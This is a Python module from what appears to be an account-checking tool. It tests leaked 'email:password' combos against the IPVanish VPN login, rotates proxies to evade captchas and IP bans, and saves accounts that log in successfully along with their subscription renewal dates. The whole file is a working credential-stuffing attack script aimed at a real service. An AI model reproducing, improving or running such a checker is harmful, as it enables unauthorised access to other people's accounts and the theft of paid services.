from checkolotl.utils.proxy import get_proxy, remove_proxy
from checkolotl.settings import settings
from checkolotl.saver import save
from datetime import datetime
import re
import requests
import urllib
import time


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
}
regex_clienttoken = re.compile(
    r"<input type=\"hidden\" name=\"clientToken\" id=\"clientToken\" value=\"([a-z0-9]*)\"\/>")
regex_expiredate = re.compile(
    r"<span class=\"profile_label\"><b>Renewal Date:<\/b><\/span>\n<span class=\"profile_label\">(\d{4}/\d{1,2}/\d{1,2})</span>")

regex_invalid = re.compile(r"Sorry, your account credentials are invalid\. Please try again")

regex_captcha = re.compile(r"We were unable to validate the captcha")

regex_disabled = re.compile(r"Embargo|Your service has been temporarily disabled")


def check(combo):
    email, password = combo.split(":", 1)
    email_encoded = urllib.parse.quote(email)
    password_encoded = urllib.parse.quote(password)
    proxies_to_ban = []
    for i in range(settings.checkers.ipvanish.check_amount):
        proxy = get_proxy("ipvanish")
        proxy_dict = {
            "http": proxy,
            "https": proxy
        }
        try:
            r_one = requests.get(url="https://account.ipvanish.com/login",
                                 headers=headers,
                                 timeout=settings.checkers.ipvanish.timeout,
                                 proxies=proxy_dict)
        except:
            if settings.checkers.ipvanish.remove_banned_proxy:
                proxies_to_ban.append(proxy)
            continue
        clienttoken = re.findall(regex_clienttoken, r_one.text)
        if clienttoken:
            cookies = {'PHPSESSID': requests.utils.dict_from_cookiejar(r_one.cookies)['PHPSESSID']}
            body_one = f"clientToken={clienttoken[0]}&username={email_encoded}&password={password_encoded}"
            try:
                r_two = requests.post(url="https://account.ipvanish.com/login/validate", headers=headers, data=body_one,
                                      cookies=cookies,
                                      timeout=settings.checkers.ipvanish.timeout,
                                      proxies=proxy_dict)
            except:
                proxies_to_ban.append(proxy)
                continue
            if re.findall(regex_invalid, r_two.text):  # Credentials are not working
                for proxy in proxies_to_ban:
                    remove_proxy("ipvanish", proxy)
                return

            if re.findall(regex_captcha, r_two.text):  # captcha
                proxies_to_ban.append(proxy)
                continue

            if re.findall(regex_disabled, r_two.text):  # disabled account
                return


            expire_entry = re.findall(regex_expiredate, r_two.text)
            if expire_entry:  # Account is working
                for proxy in proxies_to_ban:
                    remove_proxy("ipvanish", proxy)

                expire_time = datetime.strptime(expire_entry[0], "%Y/%m/%d")
                replace_dict = {
                    "expireunix": str(int(time.mktime(expire_time.timetuple()))),
                    "expireunix": str(int(time.mktime(expire_time.timetuple()))),
                    "email": email,
                    "password": password
                }
                account = str(settings.checkers.ipvanish.account_format).format(**replace_dict)
                account = expire_time.strftime(account)
                save("ipvanish", account)
                return
            time.sleep(5)

    for proxy in proxies_to_ban:
        remove_proxy("ipvanish", proxy)
